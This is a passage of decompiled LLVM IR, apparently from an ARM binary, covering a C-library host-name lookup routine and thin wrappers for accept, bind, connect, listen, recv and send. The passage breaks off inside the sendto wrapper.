  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_ce44 = load i32, i32* @r5, align 4
  %v9_ce44 = load i32, i32* @r6, align 4
  %v12_ce44 = load i32, i32* @r7, align 4
  %v15_ce44 = load i32, i32* @r8, align 4
  %v18_ce44 = load i32, i32* @sb, align 4
  %v21_ce44 = load i32, i32* @sl, align 4
  %v24_ce44 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_ce54 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ce54, i32* @fp, align 4
  %v2_ce54 = icmp eq i32 %v0_ce54, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_ce64 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_ce64, align 4
  br i1 %v2_ce54, label %bb, label %dec_label_pc_ce70

bb:                                               ; preds = %entry
  %v1_ce68 = load i32, i32* %r0.global-to-local, align 4
  %v2_ce68 = add i32 %v1_ce68, 22
  store i32 %v2_ce68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d194

dec_label_pc_ce70:                                ; preds = %entry
  %v0_ce70 = call i32 @__errno_location()
  store i32 %v0_ce70, i32* %r0.global-to-local, align 4
  %v3_ce74 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_ce74, i32* %ip.global-to-local, align 4
  %v1_ce78 = inttoptr i32 %v0_ce70 to i32*
  %v2_ce78 = load i32, i32* %v1_ce78, align 4
  store i32 %v2_ce78, i32* @r8, align 4
  %v0_ce7c = load i32, i32* @r6, align 4
  store i32 %v0_ce7c, i32* %v1_ce78, align 4
  %v0_ce80 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_ce70, i32* @r5, align 4
  %v0_ce90 = load i32, i32* @fp, align 4
  store i32 %v0_ce90, i32* %r0.global-to-local, align 4
  %v0_ce94 = load i32, i32* @sl, align 4
  store i32 %v0_ce94, i32* %r2.global-to-local, align 4
  %v0_ce98 = load i32, i32* @r7, align 4
  store i32 %v0_ce98, i32* %r3.global-to-local, align 4
  %v0_ce9c = load i32, i32* @r4, align 4
  %v7_cea4 = call i32 @__get_hosts_byname_r(i32 %v0_ce90, i32 2, i32 %v0_ce94, i32 %v0_ce98, i32 %v0_ce9c, i32 %v0_ce80, i32 %arg6)
  store i32 %v7_cea4, i32* %r0.global-to-local, align 4
  %v2_cea8 = icmp eq i32 %v7_cea4, 0
  br i1 %v2_cea8, label %dec_label_pc_d194, label %dec_label_pc_ceb0

dec_label_pc_ceb0:                                ; preds = %dec_label_pc_ce70
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_ceb4 = inttoptr i32 %arg6 to i32*
  %v2_ceb4 = load i32, i32* %v1_ceb4, align 4
  store i32 %v2_ceb4, i32* %r3.global-to-local, align 4
  %v7_ceb8 = icmp eq i32 %v2_ceb4, 1
  br i1 %v7_ceb8, label %dec_label_pc_cedc, label %dec_label_pc_cec0

dec_label_pc_cec0:                                ; preds = %dec_label_pc_ceb0
  %v7_cec0 = icmp eq i32 %v2_ceb4, 4
  br i1 %v7_cec0, label %dec_label_pc_cedc, label %dec_label_pc_cec8

dec_label_pc_cec8:                                ; preds = %dec_label_pc_cec0
  %v3_cec8 = icmp eq i32 %v2_ceb4, -1
  br i1 %v3_cec8, label %dec_label_pc_ced0, label %dec_label_pc_d194

dec_label_pc_ced0:                                ; preds = %dec_label_pc_cec8
  %v0_ced0 = load i32, i32* @r5, align 4
  %v1_ced0 = inttoptr i32 %v0_ced0 to i32*
  %v2_ced0 = load i32, i32* %v1_ced0, align 4
  store i32 %v2_ced0, i32* %r3.global-to-local, align 4
  %v7_ced4 = icmp eq i32 %v2_ced0, 2
  br i1 %v7_ced4, label %dec_label_pc_cedc, label %dec_label_pc_d194

dec_label_pc_cedc:                                ; preds = %dec_label_pc_ced0, %dec_label_pc_cec0, %dec_label_pc_ceb0
  %v0_cedc = load i32, i32* @r7, align 4
  %v1_cedc = sub i32 0, %v0_cedc
  %v1_cee0 = urem i32 %v1_cedc, 4
  store i32 %v1_cee0, i32* %r3.global-to-local, align 4
  %v2_cee0 = icmp eq i32 %v1_cee0, 0
  %v0_cee4 = load i32, i32* @r8, align 4
  %v1_cee4 = load i32, i32* @r5, align 4
  %v2_cee4 = inttoptr i32 %v1_cee4 to i32*
  store i32 %v0_cee4, i32* %v2_cee4, align 4
  %v0_cf04.pre = load i32, i32* @r4, align 4
  br i1 %v2_cee0, label %dec_label_pc_cefc, label %dec_label_pc_ceec

dec_label_pc_ceec:                                ; preds = %dec_label_pc_cedc
  %v1_ceec = load i32, i32* %r3.global-to-local, align 4
  %v2_ceec = sub i32 %v0_cf04.pre, %v1_ceec
  %v3_ceec = icmp ult i32 %v0_cf04.pre, %v1_ceec
  br i1 %v3_ceec, label %dec_label_pc_d190, label %dec_label_pc_cef4

dec_label_pc_cef4:                                ; preds = %dec_label_pc_ceec
  store i32 %v2_ceec, i32* @r4, align 4
  %v0_cef8 = load i32, i32* @r7, align 4
  %v2_cef8 = add i32 %v0_cef8, %v1_ceec
  store i32 %v2_cef8, i32* @r7, align 4
  br label %dec_label_pc_cefc

dec_label_pc_cefc:                                ; preds = %dec_label_pc_cedc, %dec_label_pc_cef4
  %v0_cf04 = phi i32 [ %v2_ceec, %dec_label_pc_cef4 ], [ %v0_cf04.pre, %dec_label_pc_cedc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  store i32 -1, i32* %v1_ceb4, align 4
  %tmp31 = icmp ult i32 %v0_cf04, 4
  br i1 %tmp31, label %dec_label_pc_d190, label %dec_label_pc_cf10

dec_label_pc_cf10:                                ; preds = %dec_label_pc_cefc
  %v0_cf10 = load i32, i32* @r4, align 4
  %v1_cf10 = add i32 %v0_cf10, -4
  store i32 %v1_cf10, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_cf10, 8
  br i1 %tmp32, label %dec_label_pc_d190, label %dec_label_pc_cf1c

dec_label_pc_cf1c:                                ; preds = %dec_label_pc_cf10
  %v1_cf1c = add i32 %v0_cf10, -12
  store i32 %v1_cf1c, i32* %r3.global-to-local, align 4
  %v0_cf20 = load i32, i32* @r7, align 4
  %v1_cf20 = add i32 %v0_cf20, 4
  store i32 %v1_cf20, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_cf2c = inttoptr i32 %v1_cf20 to i32*
  store i32 %v0_cf20, i32* %v3_cf2c, align 4
  %v0_cf30 = load i32, i32* @r5, align 4
  %v1_cf30 = load i32, i32* @sb, align 4
  %v2_cf30 = add i32 %v1_cf30, 4
  %v3_cf30 = inttoptr i32 %v2_cf30 to i32*
  store i32 %v0_cf30, i32* %v3_cf30, align 4
  %tmp33 = icmp ult i32 %v1_cf1c, 32
  br i1 %tmp33, label %dec_label_pc_d190, label %dec_label_pc_cf38

dec_label_pc_cf38:                                ; preds = %dec_label_pc_cf1c
  %v0_cf38 = load i32, i32* @r4, align 4
  %v1_cf38 = add i32 %v0_cf38, -44
  store i32 %v1_cf38, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_cf38, 256
  br i1 %tmp34, label %dec_label_pc_d190, label %dec_label_pc_cf44

dec_label_pc_cf44:                                ; preds = %dec_label_pc_cf38
  %v0_cf44 = load i32, i32* @r7, align 4
  %v1_cf44 = add i32 %v0_cf44, 44
  store i32 %v1_cf44, i32* @r6, align 4
  %v1_cf48 = add i32 %v0_cf44, 12
  store i32 %v1_cf48, i32* %r3.global-to-local, align 4
  %v0_cf4c = load i32, i32* @fp, align 4
  store i32 %v0_cf4c, i32* @r1, align 4
  store i32 %v1_cf38, i32* %r2.global-to-local, align 4
  store i32 %v1_cf44, i32* %r0.global-to-local, align 4
  %v3_cf5c = call i32 @strncpy(i32 %v1_cf44, i32 %v0_cf4c, i32 %v1_cf38)
  store i32 %v1_cf48, i32* %ip.global-to-local, align 4
  %v0_cf64 = load i32, i32* @r6, align 4
  %v1_cf64 = load i32, i32* @r7, align 4
  %v2_cf64 = add i32 %v1_cf64, 12
  %v3_cf64 = inttoptr i32 %v2_cf64 to i32*
  store i32 %v0_cf64, i32* %v3_cf64, align 4
  %v0_cf68 = load i32, i32* @fp, align 4
  store i32 %v0_cf68, i32* %r0.global-to-local, align 4
  %v0_cf6c = load i32, i32* @r5, align 4
  %v1_cf6c = load i32, i32* %ip.global-to-local, align 4
  %v2_cf6c = add i32 %v1_cf6c, 4
  %v3_cf6c = inttoptr i32 %v2_cf6c to i32*
  store i32 %v0_cf6c, i32* %v3_cf6c, align 4
  %v0_cf70 = load i32, i32* @r7, align 4
  %v2_cf74 = inttoptr i32 %v0_cf68 to i8*
  %v3_cf74 = call i32 @inet_aton(i8* %v2_cf74, i32 %v0_cf70)
  store i32 %v3_cf74, i32* %r0.global-to-local, align 4
  %v2_cf78 = icmp eq i32 %v3_cf74, 0
  br i1 %v2_cf78, label %dec_label_pc_cfbc, label %dec_label_pc_cf84

dec_label_pc_cf84:                                ; preds = %dec_label_pc_cf44
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_cf88 = load i32, i32* @sl, align 4
  %v2_cf88 = add i32 %v1_cf88, 8
  %v3_cf88 = inttoptr i32 %v2_cf88 to i32*
  store i32 2, i32* %v3_cf88, align 4
  %v0_cf8c = load i32, i32* %r3.global-to-local, align 4
  %v2_cf8c = mul i32 %v0_cf8c, 2
  %v1_cf90 = load i32, i32* @sl, align 4
  %v2_cf90 = add i32 %v1_cf90, 12
  %v3_cf90 = inttoptr i32 %v2_cf90 to i32*
  store i32 %v2_cf8c, i32* %v3_cf90, align 4
  %v3_cf94 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_cf94, i32* %r2.global-to-local, align 4
  store i32 %v1_cf48, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  %v0_cfa0 = load i32, i32* @r5, align 4
  store i32 %v0_cfa0, i32* %r0.global-to-local, align 4
  %v0_cfa4 = load i32, i32* @sl, align 4
  %v2_cfa4 = inttoptr i32 %v3_cf94 to i32*
  store i32 %v0_cfa4, i32* %v2_cfa4, align 4
  %v0_cfa8 = load i32, i32* @r6, align 4
  %v1_cfa8 = load i32, i32* @sl, align 4
  %v2_cfa8 = inttoptr i32 %v1_cfa8 to i32*
  store i32 %v0_cfa8, i32* %v2_cfa8, align 4
  %v0_cfac = load i32, i32* @sb, align 4
  %v1_cfac = load i32, i32* @sl, align 4
  %v2_cfac = add i32 %v1_cfac, 16
  %v3_cfac = inttoptr i32 %v2_cfac to i32*
  store i32 %v0_cfac, i32* %v3_cfac, align 4
  %v0_cfb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_cfb0 = load i32, i32* @sl, align 4
  %v2_cfb0 = add i32 %v1_cfb0, 4
  %v3_cfb0 = inttoptr i32 %v2_cfb0 to i32*
  store i32 %v0_cfb0, i32* %v3_cfb0, align 4
  %v0_cfb4 = load i32, i32* @r5, align 4
  %v1_cfb4 = load i32, i32* @ip, align 4
  %v2_cfb4 = inttoptr i32 %v1_cfb4 to i32*
  store i32 %v0_cfb4, i32* %v2_cfb4, align 4
  br label %dec_label_pc_d194

dec_label_pc_cfbc:                                ; preds = %dec_label_pc_cf44
  %v2_cfbc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cfbc, i32* @r5, align 4
  %v1_cfc0 = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_1d7b4.525 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_cfbc, i32* @r0, align 4
  store i32 58724, i32* %r3.global-to-local, align 4
  %v1_cfd8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_e55c.404 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d7b4.525 to i32), i32* %r0.global-to-local, align 4
  %v1_cfe8 = call i32 @__pthread_return_0()
  store i32 %v2_cfbc, i32* @r0, align 4
  %v2_cff4 = load i32, i32* @global_var_1feac.530, align 4
  store i32 %v2_cff4, i32* @r4, align 4
  store i32 58724, i32* %r3.global-to-local, align 4
  %v1_d004 = call i32 @__pthread_return_void()
  %v2_d010 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_1fea0.533 to i32), i32* %r3.global-to-local, align 4
  %v0_d01c = load i32, i32* @fp, align 4
  store i32 %v0_d01c, i32* %r0.global-to-local, align 4
  %v2_d020 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_d020, i32* @ip, align 4
  %v0_d024 = load i32, i32* @r4, align 4
  store i32 %v0_d024, i32* %r2.global-to-local, align 4
  %v6_d038 = inttoptr i32 %v0_d01c to i8*
  %v7_d038 = call i32 @__dns_lookup(i8* %v6_d038, i32 1, i32 %v0_d024, i32 ptrtoint (i32* @global_var_1fea0.533 to i32), i32 %v2_d010, i32 %v2_d020)
  store i32 %v7_d038, i32* %r0.global-to-local, align 4
  %v1_d03c = icmp slt i32 %v7_d038, 0
  br i1 %v1_d03c, label %.dec_label_pc_d168_crit_edge, label %dec_label_pc_d04c

.dec_label_pc_d168_crit_edge:                     ; preds = %dec_label_pc_cfbc
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d168

dec_label_pc_d04c:                                ; preds = %dec_label_pc_cfbc
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_d060 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_d060, 255
  br i1 %tmp35, label %dec_label_pc_d0fc, label %dec_label_pc_d068

dec_label_pc_d068:                                ; preds = %dec_label_pc_d04c
  %v3_d068 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_d068, i32* @r0, align 4
  %v0_d06c = call i32 @free()
  %v3_d070 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d070, i32* @r0, align 4
  %v0_d074 = call i32 @free()
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_ceb4, align 4
  br label %dec_label_pc_d194

dec_label_pc_d0fc:                                ; preds = %dec_label_pc_d04c
  %v3_d100.pre = load i32, i32* %stack_var_-96, align 4
  %v0_d104.pre = load i32, i32* @r6, align 4
  store i32 %v1_d060, i32* %r2.global-to-local, align 4
  store i32 %v3_d100.pre, i32* @r1, align 4
  store i32 %v0_d104.pre, i32* %r0.global-to-local, align 4
  %v3_d108 = call i32 @strncpy(i32 %v0_d104.pre, i32 %v3_d100.pre, i32 %v1_d060)
  %v3_d10c = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_d10c, i32* @r0, align 4
  %v0_d110 = call i32 @free()
  store i32 %v0_d110, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_d118 = icmp eq i32 %tmp7, 1
  br i1 %v7_d118, label %dec_label_pc_d120, label %dec_label_pc_d174

dec_label_pc_d120:                                ; preds = %dec_label_pc_d0fc
  store i32 4, i32* @r2, align 4
  %v0_d128 = load i32, i32* @r7, align 4
  store i32 %v0_d128, i32* @r0, align 4
  %v0_d12c = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_cf48, i32* %r2.global-to-local, align 4
  %v1_d138 = load i32, i32* @sl, align 4
  %v2_d138 = add i32 %v1_d138, 8
  %v3_d138 = inttoptr i32 %v2_d138 to i32*
  store i32 2, i32* %v3_d138, align 4
  %v0_d13c = load i32, i32* %r3.global-to-local, align 4
  %v2_d13c = mul i32 %v0_d13c, 2
  store i32 %v2_d13c, i32* %r3.global-to-local, align 4
  %v1_d140 = load i32, i32* @sl, align 4
  %v2_d140 = add i32 %v1_d140, 12
  %v3_d140 = inttoptr i32 %v2_d140 to i32*
  store i32 %v2_d13c, i32* %v3_d140, align 4
  %v3_d144 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d144, i32* @r0, align 4
  %v0_d148 = load i32, i32* @r6, align 4
  %v1_d148 = load i32, i32* @sl, align 4
  %v2_d148 = inttoptr i32 %v1_d148 to i32*
  store i32 %v0_d148, i32* %v2_d148, align 4
  %v0_d14c = load i32, i32* @sb, align 4
  %v1_d14c = load i32, i32* @sl, align 4
  %v2_d14c = add i32 %v1_d14c, 16
  %v3_d14c = inttoptr i32 %v2_d14c to i32*
  store i32 %v0_d14c, i32* %v3_d14c, align 4
  %v0_d150 = load i32, i32* %r2.global-to-local, align 4
  %v1_d150 = load i32, i32* @sl, align 4
  %v2_d150 = add i32 %v1_d150, 4
  %v3_d150 = inttoptr i32 %v2_d150 to i32*
  store i32 %v0_d150, i32* %v3_d150, align 4
  %v0_d154 = call i32 @free()
  %v3_d158 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_d158, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d160 = load i32, i32* @sl, align 4
  %v2_d160 = inttoptr i32 %v3_d158 to i32*
  store i32 %v0_d160, i32* %v2_d160, align 4
  %v0_d164 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_d164, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d168

dec_label_pc_d168:                                ; preds = %.dec_label_pc_d168_crit_edge, %dec_label_pc_d120
  %v0_d16c = phi i32 [ 1, %.dec_label_pc_d168_crit_edge ], [ %v0_d164, %dec_label_pc_d120 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_d16c, i32* %v1_ceb4, align 4
  br label %dec_label_pc_d194

dec_label_pc_d174:                                ; preds = %dec_label_pc_d0fc
  %v3_d174 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d174, i32* @r0, align 4
  %v0_d178 = call i32 @free()
  store i32 %arg6, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_ceb4, align 4
  br label %dec_label_pc_d194

dec_label_pc_d190:                                ; preds = %dec_label_pc_ceec, %dec_label_pc_cf38, %dec_label_pc_cf1c, %dec_label_pc_cf10, %dec_label_pc_cefc
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d194

dec_label_pc_d194:                                ; preds = %bb, %dec_label_pc_ced0, %dec_label_pc_cec8, %dec_label_pc_ce70, %dec_label_pc_d174, %dec_label_pc_d168, %dec_label_pc_d068, %dec_label_pc_cf84, %dec_label_pc_d190
  store i32 %v6_ce44, i32* @r5, align 4
  store i32 %v9_ce44, i32* @r6, align 4
  store i32 %v12_ce44, i32* @r7, align 4
  store i32 %v15_ce44, i32* @r8, align 4
  store i32 %v18_ce44, i32* @sb, align 4
  store i32 %v21_ce44, i32* @sl, align 4
  store i32 %v24_ce44, i32* @fp, align 4
  %v29_d198 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_d198

; uselistorder directives
  uselistorder i32 %v2_d13c, { 1, 0 }
  uselistorder i32 %v1_d060, { 1, 2, 0 }
  uselistorder i32 %v1_cf48, { 1, 2, 0, 3 }
  uselistorder i32 %v1_cf44, { 1, 0, 2 }
  uselistorder i32 %v1_cf38, { 2, 1, 0, 3 }
  uselistorder i32 %v0_cf04.pre, { 0, 2, 1 }
  uselistorder i32 %v1_cee0, { 1, 0 }
  uselistorder i32* %v1_ceb4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_ce54, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 15, 14, 16, 18, 17, 21, 20, 0, 1, 2 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_d194, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_d190, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_d168, { 1, 0 }
  uselistorder label %dec_label_pc_cefc, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d1b8 = load i32, i32* @r4, align 4
  store i32 %v3_d1b8, i32* %stack_var_-8, align 4
  %v5_d1bc = inttoptr i32 %arg3 to i32*
  %v6_d1bc = call i32 @accept(i32 %arg1, %sockaddr* %arg2, i32* %v5_d1bc)
  store i32 %v6_d1bc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_d1bc, -4095
  br i1 %tmp, label %dec_label_pc_d1dc, label %dec_label_pc_d1cc

dec_label_pc_d1cc:                                ; preds = %entry
  %v0_d1cc = call i32 @__errno_location()
  %v0_d1d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_d1d0 = sub i32 0, %v0_d1d0
  %v2_d1d4 = inttoptr i32 %v0_d1cc to i32*
  store i32 %v1_d1d0, i32* %v2_d1d4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d1dc

dec_label_pc_d1dc:                                ; preds = %entry, %dec_label_pc_d1cc
  %v0_d1dc = phi i32 [ %v6_d1bc, %entry ], [ -1, %dec_label_pc_d1cc ]
  %v2_d1e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d1e0, i32* @r4, align 4
  ret i32 %v0_d1dc

; uselistorder directives
  uselistorder i32 %v6_d1bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d1dc, { 1, 0 }
}

define i32 @bind() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d1e4 = load i32, i32* @r4, align 4
  store i32 %v3_d1e4, i32* %stack_var_-8, align 4
  %v0_d1e8 = call i32 @bind()
  store i32 %v0_d1e8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_d1e8, -4095
  br i1 %tmp, label %dec_label_pc_d208, label %dec_label_pc_d1f8

dec_label_pc_d1f8:                                ; preds = %entry
  %v0_d1f8 = call i32 @__errno_location()
  %v0_d1fc = load i32, i32* %r4.global-to-local, align 4
  %v1_d1fc = sub i32 0, %v0_d1fc
  %v2_d200 = inttoptr i32 %v0_d1f8 to i32*
  store i32 %v1_d1fc, i32* %v2_d200, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d208

dec_label_pc_d208:                                ; preds = %entry, %dec_label_pc_d1f8
  %v0_d208 = phi i32 [ %v0_d1e8, %entry ], [ -1, %dec_label_pc_d1f8 ]
  %v2_d20c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d20c, i32* @r4, align 4
  ret i32 %v0_d208

; uselistorder directives
  uselistorder i32 %v0_d1e8, { 1, 0, 2 }
  uselistorder i32 ()* @bind, { 1, 0 }
  uselistorder label %dec_label_pc_d208, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d210 = load i32, i32* @r4, align 4
  store i32 %v3_d210, i32* %stack_var_-8, align 4
  %v5_d214 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_d214, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_d214, -4095
  br i1 %tmp, label %dec_label_pc_d234, label %dec_label_pc_d224

dec_label_pc_d224:                                ; preds = %entry
  %v0_d224 = call i32 @__errno_location()
  %v0_d228 = load i32, i32* %r4.global-to-local, align 4
  %v1_d228 = sub i32 0, %v0_d228
  %v2_d22c = inttoptr i32 %v0_d224 to i32*
  store i32 %v1_d228, i32* %v2_d22c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d234

dec_label_pc_d234:                                ; preds = %entry, %dec_label_pc_d224
  %v0_d234 = phi i32 [ %v5_d214, %entry ], [ -1, %dec_label_pc_d224 ]
  %v2_d238 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d238, i32* @r4, align 4
  ret i32 %v0_d234

; uselistorder directives
  uselistorder i32 %v5_d214, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d234, { 1, 0 }
}

define i32 @listen() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d23c = load i32, i32* @r4, align 4
  store i32 %v3_d23c, i32* %stack_var_-8, align 4
  %v0_d240 = call i32 @listen()
  store i32 %v0_d240, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_d240, -4095
  br i1 %tmp, label %dec_label_pc_d260, label %dec_label_pc_d250

dec_label_pc_d250:                                ; preds = %entry
  %v0_d250 = call i32 @__errno_location()
  %v0_d254 = load i32, i32* %r4.global-to-local, align 4
  %v1_d254 = sub i32 0, %v0_d254
  %v2_d258 = inttoptr i32 %v0_d250 to i32*
  store i32 %v1_d254, i32* %v2_d258, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d260

dec_label_pc_d260:                                ; preds = %entry, %dec_label_pc_d250
  %v0_d260 = phi i32 [ %v0_d240, %entry ], [ -1, %dec_label_pc_d250 ]
  %v2_d264 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d264, i32* @r4, align 4
  ret i32 %v0_d260

; uselistorder directives
  uselistorder i32 %v0_d240, { 1, 0, 2 }
  uselistorder i32 ()* @listen, { 1, 0 }
  uselistorder label %dec_label_pc_d260, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d268 = load i32, i32* @r4, align 4
  store i32 %v3_d268, i32* %stack_var_-8, align 4
  %v5_d26c = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_d26c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_d26c, -4095
  br i1 %tmp, label %dec_label_pc_d28c, label %dec_label_pc_d27c

dec_label_pc_d27c:                                ; preds = %entry
  %v0_d27c = call i32 @__errno_location()
  %v0_d280 = load i32, i32* %r4.global-to-local, align 4
  %v1_d280 = sub i32 0, %v0_d280
  %v2_d284 = inttoptr i32 %v0_d27c to i32*
  store i32 %v1_d280, i32* %v2_d284, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d28c

dec_label_pc_d28c:                                ; preds = %entry, %dec_label_pc_d27c
  %v0_d28c = phi i32 [ %v5_d26c, %entry ], [ -1, %dec_label_pc_d27c ]
  %v2_d290 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d290, i32* @r4, align 4
  ret i32 %v0_d28c

; uselistorder directives
  uselistorder i32 %v5_d26c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d28c, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d294 = load i32, i32* @r4, align 4
  store i32 %v3_d294, i32* %stack_var_-8, align 4
  %v5_d298 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_d298, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_d298, -4095
  br i1 %tmp, label %dec_label_pc_d2b8, label %dec_label_pc_d2a8

dec_label_pc_d2a8:                                ; preds = %entry
  %v0_d2a8 = call i32 @__errno_location()
  %v0_d2ac = load i32, i32* %r4.global-to-local, align 4
  %v1_d2ac = sub i32 0, %v0_d2ac
  %v2_d2b0 = inttoptr i32 %v0_d2a8 to i32*
  store i32 %v1_d2ac, i32* %v2_d2b0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d2b8

dec_label_pc_d2b8:                                ; preds = %entry, %dec_label_pc_d2a8
  %v0_d2b8 = phi i32 [ %v5_d298, %entry ], [ -1, %dec_label_pc_d2a8 ]
  %v2_d2bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d2bc, i32* @r4, align 4
  ret i32 %v0_d2b8

; uselistorder directives
  uselistorder i32 %v5_d298, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d2b8, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_d2c0 = load i32, i32* @r4, align 4
  store i32 %v3_d2c0, i32* %stack_var_-12, align 4
